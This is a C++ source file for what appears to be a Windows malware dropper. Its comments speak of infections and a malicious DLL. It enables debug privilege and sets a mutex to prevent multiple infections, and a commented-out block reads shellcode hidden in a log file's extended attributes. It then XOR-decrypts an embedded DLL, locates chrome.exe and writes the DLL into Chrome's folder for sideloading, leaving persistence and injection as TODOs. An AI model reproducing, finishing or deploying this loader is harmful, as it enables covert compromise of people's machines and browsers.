///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//  Copyright © Aviv Shabtay 2020, All rights reserved
//
// THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
// ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO
// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
// PARTICULAR PURPOSE.
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#pragma warning (disable:4996)
#include <windows.h>
#include <tchar.h>
#include <TlHelp32.h>
#include <psapi.h>
#include "Helpers.h"
#include "resource.h"
#include <vector>
#include <iostream>

#define BYTES_TO_READ 4

//pRtlNtPathNameToDosPathName RtlNtPathNameToDosPathName = nullptr;
//pRtlInitUnicodeString RtlInitUnicodeString = nullptr;

BOOL XorDecrypt(PVOID pBuffer, DWORD bufferSize, DWORD password);
DWORD PasswordToInteger(TCHAR* pws);
DWORD GetAllRunningProcesses(TCHAR procToSearch[]);
BOOL GetImageFileNameByPID(DWORD dwPid, TCHAR imageFileName[]);
VOID GetNewPath(TCHAR* originalPath, TCHAR* originalFileName, TCHAR* newFileName, TCHAR* newPath);
BOOL GetDosNameFromNtName(TCHAR* ntPath, TCHAR* dosPath);

int main() {
	HANDLE hMutex = nullptr;
	BOOL result;
	DWORD dwResult;

	PVOID pEaBuffer = nullptr;
	DWORD eaLength = 332;
	DWORD shellcodeLength = 167;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	NTSTATUS status;
	pNtQueryEaFile NtQueryEaFile = nullptr;
	HANDLE hLogFile = nullptr;
	PVOID pShellcode = nullptr;

	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPriv;
	LUID luidDebug;

	HRSRC hDllResource = nullptr;
	DWORD resourceSize;
	HGLOBAL hDllResouceData = nullptr;
	PVOID pResourceMemory = nullptr;
	LPVOID pDllData = nullptr;
	TCHAR password[] = { '2','5',0 };

	HANDLE hDestination = nullptr;
	TCHAR maliciousDllLocation[] = { 'C',':','\\','t','e','m','p','\\','D','L','.','d','l','l',0 };

	TCHAR procToAttack[] = { 'c','h','r','o','m','e','.','e','x','e',0 };
	DWORD dwPidToInject;
	HANDLE hTargetProc = nullptr;
	TCHAR targetImageFileName[MAX_PATH];
	TCHAR DLL_NAME[] = { 'D','L','.','d','l','l',0 };


	// Find the export from NTDLL:
	NtQueryEaFile = (pNtQueryEaFile)GetProcAddress(GetModuleHandle(_T(NTDLL)), NT_QUERY_EA_FILE);
	if (NtQueryEaFile == nullptr) {
		printf("[-] Could not get NtQuesryEaFile function address, Error: 0x%x\n", GetLastError());
		return -1;
	}

	// Enabling the Debug access privilege
	// https://www.codeproject.com/Articles/10438/Navigating-the-PEB
	// https://medium.com/palantir/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) != FALSE)
	{
		if (LookupPrivilegeValue(_T(""), SE_DEBUG_NAME, &luidDebug) != FALSE)
		{
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luidDebug;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL);
		}
	}

	// Create Mutex to prevent multiple infections:
	// ############################################
	hMutex = CreateMutex(nullptr, FALSE, _T(MUTEX_NAME));
	if (hMutex == nullptr) {
		printf("[-] Could not create the Mutex, Error: 0x%x\n", GetLastError());
		return -1;
	}

	printf("[+] Mutex created successfully\n");

	// TODO: Create Run key for persistence:
	// #####################################

	/* Cannot debug it in Visual Studio so I used WinDbg. */
	// Extract hidden shellcode (installed in previous stage):
	// #######################################################
	/*
	// Get handle to the log file (contains EA with shellcode):
	hLogFile = CreateFile(_T(LOG_FILE_PATH), GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hLogFile == INVALID_HANDLE_VALUE) {
		printf("[-] Could not open: %s, Error: 0x%x\n", LOG_FILE_PATH, GetLastError());
		CloseHandle(hMutex);
		return -1;
	}

	// Read the shellcode from db.log Extended-Attributes:
	pEaBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, eaLength);
	if (pEaBuffer == nullptr) {
		printf("[-] Could allocate memory for the EA, Error: 0x%x\n", GetLastError());
		CloseHandle(hMutex);
		CloseHandle(hLogFile);
		return -1;
	}

	// Get the EA from db.log into the allocated buffer:
	status = NtQueryEaFile(hLogFile, &ioStatusBlock, pEaBuffer, eaLength, FALSE, nullptr, 0, nullptr, FALSE);
	if (!NT_SUCCESS(status)) {
		printf("[-] Could not query for EA, Error:0x%x.\n", status);
		CloseHandle(hMutex);
		CloseHandle(hLogFile);
		HeapFree(GetProcessHeap(), NULL, pEaBuffer);
		return -1;
	}

	// Read the EA:
	PFILE_FULL_EA_INFORMATION currEntry = (PFILE_FULL_EA_INFORMATION)pEaBuffer;
	if (_tcscmp(ATTRIBUTE_NAME, currEntry->EaName) != 0) {
		printf("[-] Could find the shellcode attribute\n");
		printf("[-] found: %s, len:%d\n", currEntry->EaName, _tcslen(currEntry->EaName));
		printf("[-] SHELLCODE: %s, len: %d\n", ATTRIBUTE_NAME, _tcslen(ATTRIBUTE_NAME));
		CloseHandle(hMutex);
		CloseHandle(hLogFile);
		HeapFree(GetProcessHeap(), NULL, pEaBuffer);
		return -1;
	}

	// Allocate memory for the EA value (the shellcode):
	pShellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, currEntry->EaValueLength + 1); // +1 for '\0'
	if (pEaBuffer == nullptr) {
		printf("[-] Could not allocate memory for the shellcode, Error: 0x%x\n", GetLastError());
		CloseHandle(hMutex);
		CloseHandle(hLogFile);
		HeapFree(GetProcessHeap(), NULL, pEaBuffer);
		return -1;
	}

	// Copy the shellcode into buffer (for convenient):
	CopyMemory(pShellcode, &currEntry->EaName[currEntry->EaNameLength + 1], currEntry->EaValueLength);
	printf("[+] The Shellcode is:\n%s\n", pShellcode);
	// ###############################################
	*/


	// TODO: Embed encrypted shellcode in db.log file.
	// Decrypt the shellcode:

	// Extract malicious DLL from resource:
	// TODO: Add the ID of the resource to .h file.
	hDllResource = FindResource(nullptr, MAKEINTRESOURCE(IDR_UPDATER1), _T(RESOURCE_NAME));
	if (hDllResource == nullptr) {
		printf("[-] Could not find the given resource, Error:0x%08x", GetLastError());
		// TODO: Add close resources if needed.
		return -1;
	}

	// Get the size of the resource:
	resourceSize = SizeofResource(NULL, hDllResource);
	hDllResouceData = LoadResource(NULL, hDllResource);
	if (hDllResouceData == nullptr) {
		printf("[-] Could not load the resource data into memory, Error:0x%08x", GetLastError());
		// TODO: Add close resources if needed.
		return -1;
	}

	// Get pointer to the resource in memory:
	pResourceMemory = LockResource(hDllResouceData);
	if (pResourceMemory == nullptr) {
		printf("[-] Could not pointer to resource in memory, Error:0x%08x", GetLastError());
		// TODO: Add close resources if needed.
		return -1;
	}

	// Allocating memory for the resource data:
	pDllData = (PVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, resourceSize);
	if (pDllData == nullptr) {
		printf("[-] Could allocate memory for the resource, Error:0x%08x", GetLastError());
		// TODO: Add close resources if needed.
		return -1;
	}

	// copy the resource into buffer before encrypting it:
	CopyMemory(pDllData, pResourceMemory, resourceSize);
	dwResult = FreeResource(pResourceMemory);
	if (dwResult != 0) {
		printf("[-] Could not free the resource, Error:0x%08x", GetLastError());
		// TODO: Add close resources if needed.
		return -1;
	}

	// Decrypt the resource:
	DWORD pass = PasswordToInteger(password);
	result = XorDecrypt(pDllData, resourceSize, pass);
	if (!result) {
		printf("[-] Could not decrypt the data\n");
		// TODO: Add close resources if needed.
		return -1;
	}

	// Finding the process to by injected:
	// TODO: If not found, try another or sleep a while (???)
	// #######################################################
	dwPidToInject = GetAllRunningProcesses(procToAttack);
	if (dwPidToInject == -1) {
		printf("[-] Could not find PID of: %s\n", procToAttack);
		// TODO: Add close resources if needed.
		return -1;
	}

	printf("[+] PID of %s is %d\n", procToAttack, dwPidToInject);

	// Get the process image file name:
	result = GetImageFileNameByPID(dwPidToInject, targetImageFileName);
	if (!result) {
		printf("[-] Could not find the image file name of PID=%d\n", dwPidToInject);
		// TODO: Add close resources if needed.
		return -1;
	}

	printf("[+] Image file name of PID=%d is: %s\n", dwPidToInject, targetImageFileName);

	TCHAR newPath[MAX_PATH] = { 0 };
	GetNewPath(targetImageFileName, procToAttack, DLL_NAME, newPath);

	TCHAR dosPath[MAX_PATH] = { 0 };
	GetDosNameFromNtName(newPath, dosPath);

	// Write the malicious DLL into target directory:
	//###############################################
	hDestination = CreateFile(dosPath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDestination == INVALID_HANDLE_VALUE) {
		printf("[-] Could not open handle to destination file: %s, Error:0x%08x\n", maliciousDllLocation, GetLastError());
		// TODO: Add close resources if needed.
		return -1;
	}

	result = WriteFile(hDestination, pDllData, resourceSize, &dwResult, NULL);
	if (!result) {
		printf("[-] Error while writing to destination file, Error:0x%08x\n", GetLastError());
		// TODO: Add close resources if needed.
		return -1;
	}

	// The DLL in place, don't need the handle anymore:
	CloseHandle(hDestination);

	// Inject the malicious DLL into target process:
	// ##############################################

	// Terminate / keep injecting (???)

	// Cleanup resources:
	CloseHandle(hMutex);
	CloseHandle(hLogFile);
	HeapFree(GetProcessHeap(), NULL, pEaBuffer);
	HeapFree(GetProcessHeap(), NULL, pShellcode);

	return 0;
}

/*
 * Preforms XOR operation on given buffer using given password.
*/
BOOL XorDecrypt(PVOID pBuffer, DWORD bufferSize, DWORD password) {
	DWORD i = 0;
	PVOID ptr = pBuffer;
	char buffer[BYTES_TO_READ] = { 0 };

	for (PVOID ptr = pBuffer; ptr < (PVOID)((DWORD)pBuffer + bufferSize); ptr = (PVOID)((DWORD)ptr + BYTES_TO_READ)) {

		CopyMemory(buffer, ptr, BYTES_TO_READ);
		*buffer = ((DWORD)*buffer) ^ ((DWORD)password);
		//DWORD decrypted = ((DWORD)buffer) ^ password;
		CopyMemory(ptr, buffer, BYTES_TO_READ);
	}

	return TRUE;
}

/*
 * Convert given String into DWORD for the XOR operation.
*/
DWORD PasswordToInteger(TCHAR* pws) {
	int x = 0;
	int i = 0;

	// Initial value:
	x = 1586;

	for (i = 0; i < _tcslen(pws); i++) {
		x += (int)pws[i];
	}
	return x;
}

/*
 * Iterate all running processes in the system and return the PID
 * of the wanted process.
*/
DWORD GetAllRunningProcesses(TCHAR procToSearch[]) {

	PROCESSENTRY32 processEntry;
	HANDLE hSnapshot;
	TCHAR tempProcName[260];
	TCHAR* procName;
	DWORD pid;

	// Get the list of all running processes:
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	// Initialize the size of the structure:
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Get the first running process:
	Process32First(hSnapshot, &processEntry);

	pid = -1;

	do {
		procName = processEntry.szExeFile;
		pid = processEntry.th32ProcessID;

		if (_tcscmp(procToSearch, procName) == 0)
			break;

	} while (Process32Next(hSnapshot, &processEntry));

	CloseHandle(hSnapshot);
	return pid;
}

/*
 * Accept PID and return the process image file name.
*/
BOOL GetImageFileNameByPID(DWORD dwPid, TCHAR imageFileName[]) {
	HANDLE hProc = nullptr;
	DWORD result;
	TCHAR ntImageName[MAX_PATH];
	NTSTATUS status;

	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
	if (hProc == INVALID_HANDLE_VALUE)
		return FALSE;

	result = GetProcessImageFileName(hProc, imageFileName, MAX_PATH);
	if (result == 0) {
		CloseHandle(hProc);
		return FALSE;
	}

	CloseHandle(hProc);
	return TRUE;
}

/*
 * Accept path and original file name return the same full path with
 * new given file name.
 */
VOID GetNewPath(TCHAR* originalPath, TCHAR* originalFileName, TCHAR* newFileName, TCHAR* newPath) {
	TCHAR* token;
	TCHAR delimiter[2] = { '\\',0 };
	DWORD i = 0;

	// Get the first token:
	token = _tcstok(originalPath, delimiter);

	// Start iterating over the tokens:
	while (TRUE) {
		if (token == nullptr)
			break;

		// Add: '\'
		CopyMemory(newPath + i, delimiter, _tcslen(delimiter));
		i += _tcsclen(delimiter);

		// Check if we reach the end of the path -> the file name:
		if (_tcscmp(token, originalFileName) == 0) {

			// Copy the new file name instead the original:
			CopyMemory(newPath + i, newFileName, _tcslen(newFileName));
			break;
		}
		else {
			// Add the token:
			CopyMemory(newPath + i, token, _tcslen(token));
			i += _tcsclen(token);
		}
		token = _tcstok(nullptr, delimiter);
	}
}

/*
 * Accept path in NT form and convert it to DOS form by querying
 * the OS for the existing drives in the system.
 * https://github.com/zodiacon/Win10SysProgBookSamples/blob/master/Chapter07/MD5Calculator/EventParser.cpp
*/
BOOL GetDosNameFromNtName(TCHAR* ntPath, TCHAR* dosPath) {
	DWORD drives;
	DWORD drive = 0;
	DWORD result;
	TCHAR pathDelimiter[] = { '\\' };

	drives = GetLogicalDrives();
	while (drives) {

		// Check if the drive exist in the system:
		if (drives & 1) {

			// Template of drive name -> (X:):
			TCHAR driveName[] = "X:";

			// Fill with the current drive name:
			driveName[0] = (TCHAR)(drive + 'A');

			TCHAR path[MAX_PATH];
			result = QueryDosDevice(driveName, path, MAX_PATH);

			// Check if this is the drive for our path:
			TCHAR temp[MAX_PATH] = { 0 };
			CopyMemory(temp, ntPath, _tcslen(path));

			if (_tcscmp(path, temp) == 0) {
				DWORD i = 0;
				// Add the drive:
				CopyMemory(dosPath, driveName, _tcslen(driveName));
				i += _tcslen(driveName);

				// Add the rest of the path:
				CopyMemory(dosPath + i, ntPath + _tcslen(path), _tcslen(ntPath) - _tcslen(path));
				return TRUE;
			}
		}
		drive++;
		drives >>= 1;
	}
	return FALSE;
}
